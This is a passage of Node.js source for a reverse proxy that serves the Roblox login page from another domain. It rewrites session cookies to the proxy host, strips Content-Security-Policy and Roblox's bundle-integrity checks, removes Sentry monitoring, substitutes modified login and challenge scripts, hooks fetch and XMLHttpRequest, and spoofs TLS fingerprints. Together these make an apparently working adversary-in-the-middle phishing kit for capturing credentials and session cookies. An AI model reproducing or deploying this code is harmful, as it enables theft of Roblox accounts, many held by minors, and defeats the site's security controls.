        'User-Agent':      req.headers['user-agent'] || BROWSER_UA,
        'Accept':          req.headers['accept'] || '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
    };

    if (req.headers['cookie']) headers['Cookie'] = req.headers['cookie'];
    if (req.headers['content-type']) headers['Content-Type'] = req.headers['content-type'];

    let body = null;
    if (['POST', 'PUT', 'PATCH'].includes(req.method.toUpperCase())) {
        body = await new Promise((resolve) => {
            const bufs = [];
            req.on('data', c => bufs.push(c));
            req.on('end', () => resolve(Buffer.concat(bufs)));
        });
    }

    try {
        const result = await makeCurlRequest(req.method, targetUrl, headers, body, false);
        console.log(`[funcaptcha] ← ${result.statusCode}`);

        for (const [k, v] of Object.entries(result.headers)) {
            if (k === 'set-cookie') {
                res.set('Set-Cookie', rewriteCookies([].concat(v), getCleanHost(req)));
            } else {
                try { res.set(k, v); } catch (_) {}
            }
        }
        res.status(result.statusCode).send(result.body);
    } catch (err) {
        console.error(`[funcaptcha] ❌ ${err.message}`);
        if (!res.headersSent) res.status(502).json({ error: 'Funcaptcha proxy error', message: err.message });
    }
});

// ─────────────────────────────────────────────────────────────
// MODIFIED JS FILES — serve from modified-js/ at /js/ paths
// These must be before the main Roblox proxy so our versions win.
// ─────────────────────────────────────────────────────────────
function serveModifiedJs(filename) {
    return (req, res) => {
        const origin = req.headers['origin'] || `https://${req.headers.host}`;
        setCors(res, origin);
        res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
        res.setHeader('Cache-Control', 'no-store');
        console.log(`[modified-js] ${req.path} → modified-js/${filename}`);
        res.sendFile(path.join(__dirname, 'modified-js', filename), (err) => {
            if (err) {
                console.error(`[modified-js] Error serving ${filename}: ${err.message}`);
                res.status(500).end();
            }
        });
    };
}

app.get(/^\/js\/enforcement\.[a-f0-9]+\.js$/i,  serveModifiedJs('enforcement.b68ab7a7f261051e8c53cfe808ea9418.js'));
app.get('/js/Challenge.js',       serveModifiedJs('Challenge.js'));
app.get('/js/ReactLogin.js',      serveModifiedJs('ReactLogin.js'));
app.get('/js/CoreUtilities.js',   serveModifiedJs('CoreUtilities.js'));
app.get('/js/EnvironmentUrls.js', serveModifiedJs('EnvironmentUrls.js'));
app.get('/js/PresenceStatus.js',  serveModifiedJs('PresenceStatus.js'));

// ─────────────────────────────────────────────────────────────
// MAIN PAGE HANDLER
// ─────────────────────────────────────────────────────────────
app.use('/', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    proxyTimeout: 30000,
    timeout: 30000,
    agent: httpsAgent,

    pathRewrite: (reqPath) => (reqPath === '/' ? '/login' : reqPath),

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('user-agent',      req.headers['user-agent'] || BROWSER_UA);
            proxyReq.setHeader('accept',          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
            proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
            proxyReq.setHeader('accept-encoding', 'identity');
        },
        
        proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
            const host   = req.headers.host || 'localhost';
            const origin = req.headers['origin'] || `https://${host}`;

            delete proxyRes.headers['content-security-policy'];
            delete proxyRes.headers['content-security-policy-report-only'];
            delete proxyRes.headers['x-content-security-policy'];

            if (proxyRes.headers['set-cookie']) {
                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], getCleanHost(req));
                console.log(`[main] 🍪 Rewrote ${proxyRes.headers['set-cookie'].length} cookies → .${host.replace(/^www\./, '')}`);
            }

            res.setHeader('access-control-allow-origin',      origin);
            res.setHeader('access-control-allow-credentials', 'true');

            const ct = proxyRes.headers['content-type'] || '';
            if (!ct.includes('text/html')) return buffer;

            let body = buffer.toString('utf8');

            body = body.replace(/<meta[^>]*http-equiv\s*=\s*["']?content-security-policy["']?[^>]*>/gi, '');
            body = body.replace(/<meta[^>]*http-equiv\s*=\s*["']?x-content-security-policy["']?[^>]*>/gi, '');

            body = body.replace(/<script[^>]*>\s*var Roblox\s*=\s*Roblox[^<]*BundleVerifierConstants[\s\S]*?<\/script>/gi, '');
            body = body.replace(/<script[^>]*bundleVerifier\.js[^>]*><\/script>/gi, '');

            console.log('[main] 🚫 bundleVerifier removed');

            // ── Remove Sentry error tracking ─────────────────────────────────────
            // Sentry is non-essential monitoring; removing it stops error reports
            // from being sent to Sentry's servers without breaking page functionality
             body = body.replace(/<meta[^>]*name\s*=\s*["']?sentry-meta["']?[^>]*>/gi, '');
             body = body.replace(/<script[^>]*data-bundlename\s*=\s*["']?Sentry["']?[^>]*><\/script>/gi, '');
             console.log('[main] 🚫 Sentry removed');

            const realTimeHash = '22d5ad7788622164771c3a767cdb21d73ca0b9cbfd24dd9b918fd3d748d5c5a1';
            const realTimeRegex = new RegExp(`<script[^>]*${realTimeHash}[^>]*><\\/script>`, 'g');
            body = body.replace(realTimeRegex, '');

            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-EnvironmentUrls\.js[^"']*/g,
                `/js/EnvironmentUrls.js`
            );
            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-CoreUtilities\.js[^"']*/g,
                `/js/CoreUtilities.js`
            );
            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-Challenge\.js[^"']*/g,
                `/js/Challenge.js`
            );
            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-ReactLogin\.js[^"']*/g,
                `/js/ReactLogin.js?v=1`
            );

            // ── Inject page-guac-migration meta — matches working proxy exactly.
            // Tells Roblox JS to use /guac-v2/v1/bundles/ instead of
            // /universal-app-configuration/v1/behaviors/ for behaviour fetches.
            if (!body.includes('page-guac-migration')) {
                const guacMeta = '<meta name="page-guac-migration"'
                    + ' data-v1-path="/universal-app-configuration/v1/behaviors/\u003cbehaviour-name\u003e/content"'
                    + ' data-v2-path="/guac-v2/v1/bundles/\u003cbehaviour-name\u003e"'
                    + ' data-behavior-page-heartbeat-v2="true"'
                    + ' data-behavior-app-policy="true"'
                    + ' data-behavior-chat-ui="true"'
                    + ' data-behavior-cookie-policy="true"'
                    + ' data-behavior-intl-auth-compliance="true"'
                    + ' data-behavior-navigation-header-ui="true"'
                    + ' data-behavior-user-heartbeats="true"'
                    + ' data-behavior-free-communication-infographics="true"'
                    + ' data-behavior-play-button-ui="true"'
                    + ' data-behavior-vpc-launch-status="true"'
                    + ' data-behavior-configure-group-ui="true"'
                    + ' data-behavior-content-rating-logo="true"'
                    + ' data-behavior-group-details-ui="true"'
                    + ' data-behavior-inventory-creator-policy="true"'
                    + ' data-behavior-legal-text-eea-uk="true"'
                    + ' data-behavior-private-messages-ui="true"'
                    + ' data-behavior-texas-u18-vpc-optimization="true"'
                    + ' data-behavior-user-agreements-policy="true"'
                    + ' data-behavior-user-settings-global-privacy-control-policy="true"'
                    + ' data-behavior-vng-buy-robux="true"'
                    + ' data-behavior-web-profile-ui="true"'
                    + ' data-behavior-display-names="true"'
                    + ' data-behavior-report-abuse-ui="true"'
                    + ' data-behavior-account-settings-ui="true"'
                    + ' data-behavior-abuse-reporting-revamp="true">';
                body = body.replace('</head>', guacMeta + '</head>');
                console.log('[main] ✅ page-guac-migration meta injected');
            }

            const metaTags = generateProxyMetaTags();

            // ── Intercept direct Roblox domain requests and rewrite to proxy ──
            const robloxInterceptor = `<script>
(function(){
    var ROBLOX_RE = /https?:\\/\\/([a-z0-9\\-]+\\.)?roblox\\.com(:[0-9]+)?/gi;
    function rewrite(url){
        if(typeof url !== 'string') return url;
        return url.replace(ROBLOX_RE, '');
    }
    var _fetch = window.fetch;
    window.fetch = function(input, init){
        if(typeof input === 'string'){ input = rewrite(input); }
        else if(input && typeof input === 'object' && input.url){ input = new Request(rewrite(input.url), input); }
        return _fetch.call(this, input, init);
    };
    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url){
        arguments[1] = rewrite(url);
        return _open.apply(this, arguments);
    };
})();
</script>`;

            body = body.replace('<head', `<head>${robloxInterceptor}${metaTags}`);
            console.log('[main] 🔒 Roblox URL interceptor injected');

            return body;
        }),

        error: (err, req, res) => {
            console.error(`[main] ❌ ${req.method} ${req.path} | ${err.code}: ${err.message}`);
            if (!res.headersSent) res.status(502).send('Proxy error');
        }
    }
}));

// ─────────────────────────────────────────────────────────────
// START
// ─────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Proxy running on port ${PORT}`);
    console.log(`📁 Modified JS from: ${path.join(__dirname, 'modified-js')}`);
    console.log(`📋 ${API_ROUTES.length} API routes | ${ARKOSE_ROUTES.length} Arkose routes`);
    console.log(`🧩 Captcha routes: /v2/* → captcha.roblox.com | /funcaptcha/* → captcha.roblox.com`);
    console.log(`🔒 ALL requests now use curl-impersonate for TLS fingerprint spoofing`);
    console.log(`✅ FIXED: Added /fc/a/, /fc/ca/, /fc/gfct/, /pows/, /params/, /rtig/ routes`);
    console.log(`✅ FIXED: Added /assets/ec-game-core/, /public_key/, /cdn/fc/assets/, /game/report-event/ routes`);
    console.log(`✅ FIXED: Enforcement HTML handler now matches /v2/ prefix`);
});
